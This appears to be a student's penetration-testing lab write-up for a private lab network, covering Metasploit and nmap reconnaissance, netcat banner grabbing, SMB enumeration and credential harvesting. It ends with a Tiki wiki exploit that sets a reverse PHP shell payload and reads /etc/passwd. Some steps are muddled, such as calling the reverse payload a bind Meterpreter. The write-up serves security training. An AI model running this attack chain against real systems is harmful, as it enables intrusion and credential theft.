### Part 1

**1. Login and Start Framework Database**

Log on to the Kali LAN VM by using the username of `root` with the password of `toor`.  

Once logged in, from a command line terminal, start up the database service that Metasploit uses.  Then initialize the framework database before moving on.

**2. Start Metasploit**

From your open terminal start Metasploit.

- `service postgresql start`
- `msfdb init`
- `msfconsole`
- Check the status of your database by typing `db_status`.  

**3. Create and use a workspace**

Create a new workspace named “internal” and then set Metasploit to use that new workspace.

- `workspace -a internal` 

**4. Identify and Scan IP subnet**

Open another command line and in it identify the IP address of your Kali machine.  Next, return to the Metasploit console and perform a simple scan using nmap on the subnet that it belongs to.  Your focus is to identify the live IP addresses on this subnet and have that data automatically added to the workspace database.

- `ifconfig`
- `db_nmap -sS 192.168.1.0/24`

**5. View Discovered Hosts and IP Adderesses**

Once the Nmap scan is complete, use the appropriate command in Metasploit to display the hosts you discovered during the scan along with their associated IP addresses.  Next, copy all of the listed host IP addresses, add them to into a file named lan.txt and then save that new file.

- `db_nmap -sS 192.168.1.0/24`
- `hosts`
- `db_nmap -sS -oN lan.txt 192.168.1.0/24`

**6. Identify Host Operating Systems**

From the Metasploit console, use Nmap to scan the systems you discovered. Use the lan.txt file as the source of IP addresses to scan. This time, ensure Nmap also determines the operating system running on these devices.

After the scan is complete, use the appropriate command to view the host information again.  Make a mental note concerning what operating systems you will be dealing with on this network.

- `db_nmap -sS -O -oN lan.txt 192.168.1.0/24`
  - Alternatively `-A` could be used instead of `-O` 
- `hosts`

**7. View Services on Specific Hosts**

Use the appropriate command to list the services that were discovered on all systems.

Since we want to focus on 192.168.1.250, use the command to list the service information for that specific system.

- `services`
- `services 192.168.1.250`

**8. Run Nmap Scripting Engine Against a Host**

Run all of the default nmap scripting engine scripts against the .250 host to attempt to discover any vulnerabilities on that system.

- `db_nmap --script "default" 192.168.1.250`

**9. Continue Host Discovery**

Continue your discovery by scanning the 192.168.1.* network segment. Try to gain as much information as possible about your targets. Research version types, possible OS and service-related vulnerabilities and prepare a list of possible attack vectors for future use against the services you discover.  To keep things straight, document your notes and findings in a text file on your attack (Kali) box.

- `db_nmap --top-ports 20 192.168.1.250`
- `db_nmap -oN subnet.txt --script "(default or safe or intrusive)" 192.168.1.250`
- `db_nmap -T4 -A -v 20 192.168.1.250`

### Part 2

**1. Test an Open Port with Telnet**

With the previous scan of 192.168.1.250, you noted that the IMAP port appears to be open.  Use Use telnet to confirm, then record its status.

- Using `telnet 192.168.1.250 143` you can establish a TCP connection. However, a message that says `Connection closed by foreign host` appears meaning that the telnet service fails.

**2. Grab the Banner Information**

You also noticed that port 80 appears to be open as well on 192.168.1.250. Use netcat to grab the banner from this system and export the results to 192_168_1_250_Banner_Grab.txt.  Next, review the contents of the banner grab text file from the command line.  Make note of the server operating system in your findings.
- `nc 192.168.1.250 80 > 192_168_1_250_Banner_Grab.txt`
- Press `enter` then `HEAD/HTTP/1.0`

**3. Get More Web Server Information**

Use netcat again, but this time use the technique to pull more information from the webserver.  You will be using the GET command and will need to pipe the results into a file named 192_168_1_250_GET_output.txt.
- `nc 192.168.1.250 80 > 192_168_1_250_GET_output.txt`
-  Press `enter` then `GET HEAD/ HTTP/1.0` then press the enter key twice.

**4. Find User Account Credentials**

Use grep to find all of the user accounts in the 192_168_1_250_GET_output.txt file.  Make note of the account and password data for possible future use.
- `grep 'user' 192_168_1_250_GET_output.txt `

**5. Continue Scan Verification Hosts**

Continue testing the ports of the systems you have run across and see if you can discern any other inroads to use in the future. As always, document your findings on your attack (Kali) box.
- `nc -v 192.168.1.250 1-1000`

### Part 3

**1. Return to Metasploit**

Return to Metasploit.  If you closed the Metasploit console terminal earlier please ensure you also return to the internal workspace you created earlier.

- `msfconsole` 

**2. Run Service Scans on Windows XP Host**

Review your notes and find the Windows XP device on the network.  Next, query Metasploit for the services running on that system.  The detail on these services looks pretty thin.  Use Metasploit to perform an SMB and a NetBIOS scan on the Windows XP host.

- `services 192.168.1.200`
- `use auxiliary/scanner/netbios/nbname`
- `use auxiliary/scanner/smb/smb_enumusers`
- `use auxiliary/scanner/smb/smb_login`
- `use auxiliary/scanner/smb/smb_enumshares`
- `use auxiliary/scanner/smb/smb2`
- `use auxiliary/scanner/smb/smb_version`

**3. Identify Services on a Host**

In Metasploit, query and review the new data uncovered concerning the services running on the Windows XP host.

Services found are:
- `Windows 2008 Service Pack 1`
- `Samba 3.4.7`

**4. Continue Host Enumeration**

As always, continue your target host enumeration with Metasploit tools against other systems on the network segment.  Note your findings in a text file on your attack (Kali) box.

Interesting things about the server are:
- `System does not accept authentication with any credentials`
- `Supports SMB 2`

### Part 4

**1. Search for Specfic Application Exploits**

Having assessed the results of your previous scans note that PHP is enabled on one of the systems - providing an avenue for potential exploitation. After reviewing 192_168_1_250_GET_output.txt file, you determine that PHP is being used on this server with Tiki wiki.  Armed with that knowledge use it to find possible exploits that can be used.

**2. Select Attack Module**

Next, from the list of possible exploits, choose the exploit that best lines up with the specific wiki and PHP.  Go through the steps of setting up the exploit, prepping a bind TCP Meterpreter payload, and deploying it against the server.  Note all the details concerning the database and user credentials.

- `search tikiwiki`
- `use exploit/unix/webapp/tikiwiki_graph_formula_exec`
- `show options`
- `set RHOSTS 192.168.1.250`
- `set targeturi /kiki/`
- `show payloads`
- `set payload php/reverse_php`
- `show options`
- `set LHOST 192.168.1.50`
- `exploit`
  - If for some reason it fails run `exploit` again. If it still fails check your options.
- `whoami`
- `cat /etc/passwd`

**3. Continue Exploitation**

You now have one Meterpreter session on the Linux box. There may be other ways to gain a session on this machine. Using Metasploit, try to find an additional way to exploit this Linux victim. As usual, document your findings on your attack (Kali) box.






 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
